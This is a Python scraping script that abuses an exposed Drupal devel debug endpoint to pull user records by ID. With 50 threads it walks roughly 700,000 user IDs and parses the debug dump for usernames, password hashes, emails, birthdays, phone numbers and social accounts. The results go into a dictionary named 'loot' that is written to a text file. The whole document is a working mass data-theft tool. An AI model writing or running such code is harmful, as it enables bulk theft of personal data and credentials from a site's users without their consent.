import requests
from bs4 import BeautifulSoup



import os
if not os.path.exists('users.txt'):

    file = open('users.txt', 'r+')
else:
    file = open('users.txt', 'a')


if not os.path.exists('users_id.txt'):

    users_id = open('users_id.txt', 'w')
else:
    users_id = open('users_id.txt', 'r+')


def get_id(user):
    url = 'https://d/devel/load-with-references/user/'
    page = requests.get(url+user)
    soup = BeautifulSoup(page.text, "html.parser")


def extractor(user_id: int):
    url = 'https:///devel/load-with-references/user/'

    page = requests.get(url+str(user_id), timeout=2)

    soup = BeautifulSoup(page.text, "html.parser")
    c = 0
    s = soup.find_all('span', attrs={'class' : ['sf-dump-key', 'sf-dump-str']})
    keys = ['uid', 'name', 'pass', 'mail', 'init', 'field_account_type', 'field_birthday_date', 'field_phon', 'field_public_e_mail_address', 'field_twitter', 'field_instagram']

    loot = {}

    counter = 0
    for i in s:
        if len(loot) == len(keys):
            file.write(str(loot))
            file.write("\n")
            file.flush()
            print(loot)
            return
            #return loot
        for x in keys:
            if i.text == x and i.text not in loot:
                loot[x] = s[counter+2].text

        counter += 1
    if len(loot) > 0:
        file.write(str(loot))
        file.write("\n")
        file.flush()
        print(loot)
        return

import concurrent.futures


with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(extractor, line) for line in range(194674, 902131)]
    #user = line.strip().lstrip("https:///review/")
    #futures = [executor.submit(get_id, user)]

users_id.close()
file.close()
